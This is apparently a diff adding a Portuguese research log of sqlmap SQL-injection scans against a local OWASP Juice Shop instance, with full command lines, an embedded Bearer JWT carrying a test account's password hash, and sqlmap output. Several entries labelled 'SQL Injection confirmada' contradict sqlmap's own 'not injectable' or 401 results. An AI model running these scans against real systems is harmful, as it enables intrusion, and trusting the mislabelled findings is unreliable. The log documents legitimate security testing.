+  [00:21:06] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:06] [INFO] loading tamper module 'space2comment'
+  [00:21:06] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:06] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:06] [INFO] flushing session file
+  [00:21:06] [INFO] testing connection to the target URL
+  [00:21:06] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
+  [00:21:06] [WARNING] HTTP error codes detected during run:
+  401 (Unauthorized) - 1 times
+  
+  [*] ending @ 00:21:06 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[20/41] Testando: api_recycles_list
+  Método:    GET
+  Path:      /api/Recycles
+  Descrição: Listar itens de reciclagem
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Recycles" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_recycles_list
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[']_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [)]     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:06 /2026-06-01/
+  
+  [00:21:06] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:06] [INFO] loading tamper module 'space2comment'
+  [00:21:06] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:07] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:07] [INFO] testing connection to the target URL
+  [00:21:07] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:07] [INFO] testing if the target URL content is stable
+  [00:21:07] [INFO] target URL content is stable
+  [00:21:07] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:07] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:07] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:07] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:07] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:07] [WARNING] reflective value(s) found and filtering out
+  [00:21:08] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:08] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:08] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:08] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:08] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:08] [INFO] testing 'Generic inline queries'
+  [00:21:08] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:08] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:08] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:08] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:08] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:08] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:08] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:08] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:09] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:09] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:09] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 73 times
+  
+  [*] ending @ 00:21:09 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[21/41] Testando: api_recycles_get_by_id
+  Método:    GET
+  Path:      /api/Recycles/1
+  Descrição: Obter reciclagem por ID
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Recycles/1" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_recycles_get_by_id
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [.]     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:09 /2026-06-01/
+  
+  [00:21:09] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:09] [INFO] loading tamper module 'space2comment'
+  [00:21:09] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:10] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:10] [INFO] flushing session file
+  [00:21:10] [INFO] testing connection to the target URL
+  [00:21:10] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:10] [INFO] testing if the target URL content is stable
+  [00:21:10] [INFO] target URL content is stable
+  [00:21:10] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:10] [INFO] URI parameter '#1*' appears to be dynamic
+  [00:21:10] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:10] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:10] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:10] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:10] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:11] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:11] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:11] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:11] [INFO] testing 'Generic inline queries'
+  [00:21:11] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:11] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:11] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:11] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:11] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:11] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:11] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:11] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:11] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:11] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 72 times
+  
+  [*] ending @ 00:21:11 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[22/41] Testando: api_recycles_create
+  Método:    POST
+  Path:      /api/Recycles
+  Descrição: Criar requisição de reciclagem
+  Auth:      Sim (Bearer JWT)
+  Body:      {"UserId": 1, "quantity": 100, "AddressId": 1, "isPickup": true, "date": "2025-01-01"}
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/Recycles" --method=POST --data='{"UserId": 1, "quantity": 100, "AddressId": 1, "isPickup": true, "date": "2025-01-01"}' --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4\nContent-Type: application/json"
+
+  [?] Resultado inconclusivo para api_recycles_create
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[.]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [)]     | .'| . |
+  |___|_  [)]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:12 /2026-06-01/
+  
+  [00:21:12] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:12] [INFO] loading tamper module 'space2comment'
+  [00:21:12] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36 Edg/129.0.0.0' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:12] [INFO] flushing session file
+  [00:21:12] [INFO] testing connection to the target URL
+  [00:21:12] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
+  [00:21:12] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:12] [INFO] testing if the target URL content is stable
+  [00:21:13] [INFO] target URL content is stable
+  [00:21:13] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter 'id' in 'www.site.com/index.php?id=1')
+  [00:21:13] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 3 times
+  
+  [*] ending @ 00:21:13 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[23/41] Testando: api_security_questions
+  Método:    GET
+  Path:      /api/SecurityQuestions
+  Descrição: Listar perguntas de segurança
+  Auth:      Não
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/SecurityQuestions"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em api_security_questions
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[,]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [)]     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:13 /2026-06-01/
+  
+  [00:21:13] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:13] [INFO] loading tamper module 'space2comment'
+  [00:21:13] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/139 Version/11.1.1 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:14] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:14] [INFO] flushing session file
+  [00:21:14] [INFO] testing connection to the target URL
+  [00:21:14] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:14] [INFO] testing if the target URL content is stable
+  [00:21:14] [INFO] target URL content is stable
+  [00:21:14] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:14] [WARNING] URI parameter '#1*' does not appear to be dynamic
+  [00:21:14] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:14] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:14] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:14] [WARNING] reflective value(s) found and filtering out
+  [00:21:14] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:14] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+  [00:21:14] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+  [00:21:15] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+  [00:21:15] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+  [00:21:15] [INFO] testing 'Generic inline queries'
+  [00:21:15] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+  [00:21:15] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
+  [00:21:15] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
+  [00:21:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+  [00:21:15] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+  [00:21:15] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
+  [00:21:15] [INFO] testing 'Oracle AND time-based blind'
+  it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
+  [00:21:15] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
+  [00:21:15] [WARNING] URI parameter '#1*' does not seem to be injectable
+  [00:21:15] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests
+  [00:21:15] [WARNING] HTTP error codes detected during run:
+  500 (Internal Server Error) - 73 times
+  
+  [*] ending @ 00:21:15 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[24/41] Testando: api_security_answers
+  Método:    GET
+  Path:      /api/SecurityAnswers
+  Descrição: Listar respostas de segurança
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/api/SecurityAnswers" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [?] Resultado inconclusivo para api_security_answers
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___[']_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [']     | .'| . |
+  |___|_  [']_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:16 /2026-06-01/
+  
+  [00:21:16] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:16] [INFO] loading tamper module 'space2comment'
+  [00:21:16] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:17] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:17] [INFO] flushing session file
+  [00:21:17] [INFO] testing connection to the target URL
+  [00:21:17] [CRITICAL] not authorized, try to provide right HTTP authentication type and valid credentials (401). If this is intended, try to rerun by providing a valid value for option '--ignore-code'
+  [00:21:17] [WARNING] HTTP error codes detected during run:
+  401 (Unauthorized) - 1 times
+  
+  [*] ending @ 00:21:17 /2026-06-01/
+  
+  
+  
+  --- Fim da saída ---
+
+--------------------------------------------------------------------------------
+[25/41] Testando: rest_basket
+  Método:    GET
+  Path:      /rest/basket/1
+  Descrição: Obter carrinho por ID
+  Auth:      Sim (Bearer JWT)
+--------------------------------------------------------------------------------
+  CMD: C:\Users\pedro\.rye\py\cpython@3.12.9\python.exe C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\sqlmap.py --batch --level=1 --risk=1 --random-agent --threads=1 --timeout=30 --retries=2 --technique=BEUSTQ --tamper=space2comment --output-dir="C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output" --flush-session -u "http://localhost:3000/rest/basket/1" --headers="Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjQsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0ZUB0ZXN0ZS5jb20iLCJwYXNzd29yZCI6ImYxNzk0ZTU2NmIxMGEzNzE1YTIyNGZiZWI5ZDI2NjY4Iiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wNi0wMSAwMzoxOTozNy41MjkgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNzgwMjgzOTg0fQ.r3LjvhcEfl-SljI8hEfzEOV6CXkmSsqFNrZkypyQBe9EZ_k1X9lDN3BTKMtdoGdmzwH5HBcYY11KtXPnj46GyEjC911pGGSKjQK3CWcwaHIkO4o0w2Dl5KQD8syGEmL-c8BQJZP7e8ERM4rrTGHGcMgiXU4czmkKZQO50Gkc2F4"
+
+  [!!!] VULNERABILIDADE ENCONTRADA em rest_basket
+        -> SQL Injection confirmada
+
+  --- Saída do sqlmap ---
+          ___
+         __H__
+   ___ ___["]_____ ___ ___  {1.10.5.3#dev}
+  |_ -| . [,]     | .'| . |
+  |___|_  [,]_|_|_|__,|  _|
+        |_|V...       |_|   https://sqlmap.org
+  
+  [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+  
+  [*] starting @ 00:21:17 /2026-06-01/
+  
+  [00:21:17] [WARNING] using 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\juice_shop_sqlmap_logs\sqlmap_output' as the output directory
+  [00:21:17] [INFO] loading tamper module 'space2comment'
+  [00:21:17] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.7151.104 ADG/11.1.4905 Safari/537.36' from file 'C:\Users\pedro\workspaces\faculty\research\tcc\sqlmap-dev\data\txt\user-agents.txt'
+  [00:21:18] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
+  do you want to try URI injections in the target URL itself? [Y/n/q] Y
+  [00:21:18] [INFO] testing connection to the target URL
+  [00:21:18] [INFO] checking if the target is protected by some kind of WAF/IPS
+  [00:21:18] [INFO] testing if the target URL content is stable
+  [00:21:18] [INFO] target URL content is stable
+  [00:21:18] [INFO] testing if URI parameter '#1*' is dynamic
+  [00:21:18] [INFO] URI parameter '#1*' appears to be dynamic
+  [00:21:18] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
+  [00:21:18] [INFO] testing for SQL injection on URI parameter '#1*'
+  [00:21:18] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+  [00:21:19] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+  [00:21:19] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
